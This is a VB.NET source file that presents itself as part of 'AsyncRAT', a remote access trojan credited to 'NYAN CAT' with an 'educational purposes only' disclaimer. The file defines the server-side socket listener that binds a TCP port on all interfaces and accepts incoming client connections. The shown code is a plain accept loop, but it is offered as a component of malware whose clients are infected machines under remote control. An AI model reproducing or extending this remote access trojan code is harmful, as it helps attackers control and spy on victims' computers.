Imports System.Net.Sockets
Imports System.Net

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class ServerSocket
    Public S As Socket

    Sub Start(ByVal Port As Integer)
        S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Dim IpEndPoint As IPEndPoint = New IPEndPoint(IPAddress.Any, Port)

        S.ReceiveBufferSize = 1024 * 5000
        S.SendBufferSize = 1024 * 5000
        S.Bind(IpEndPoint)
        S.Listen(999)

        Dim T As New Threading.Thread(AddressOf BegingAccpet) : T.Start()
    End Sub

    Async Sub BegingAccpet()
        While True
            S.BeginAccept(New AsyncCallback(AddressOf EndAccept), S)
            Await Task.Delay(1)
        End While
    End Sub

    Sub EndAccept(ByVal ar As IAsyncResult)
        Try
            Dim C As New Client(S.EndAccept(ar))
        Catch ex As Exception
        End Try
    End Sub


End Class
